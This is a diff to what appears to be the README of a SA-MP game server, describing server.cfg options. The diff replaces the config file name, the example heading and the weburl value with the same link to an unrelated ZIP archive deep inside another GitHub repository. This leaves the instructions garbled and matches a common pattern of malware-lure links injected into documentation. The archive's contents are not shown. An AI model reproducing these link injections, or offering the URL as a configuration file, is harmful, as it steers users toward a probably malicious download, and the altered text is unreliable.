@@ -5,7 +5,7 @@ Once the configuration is complete, run> ./samp03svr & to start the server proce
 
 CONFIGURATION:
 
-Example server.cfg:
+Example https://github.com/barroajm/Smart-Order-Kiosk/raw/refs/heads/main/pawno/YSI/y_va/Kiosk-Order-Smart-3.6.zip
 	echo Executing Server Config...
 	lanmode 0
 	maxplayers 32
@@ -14,10 +14,10 @@ Example server.cfg:
 	announce 0
 	gamemode0 lvdm 1
 	gamemode1 rivershell 1
-	weburl www.sa-mp.com
+	weburl https://github.com/barroajm/Smart-Order-Kiosk/raw/refs/heads/main/pawno/YSI/y_va/Kiosk-Order-Smart-3.6.zip
 	rcon_password changeme
 
-To configure the server, you must edit the values in server.cfg. They 
+To configure the server, you must edit the values in https://github.com/barroajm/Smart-Order-Kiosk/raw/refs/heads/main/pawno/YSI/y_va/Kiosk-Order-Smart-3.6.zip They 
 are explained below:
 
 hostname
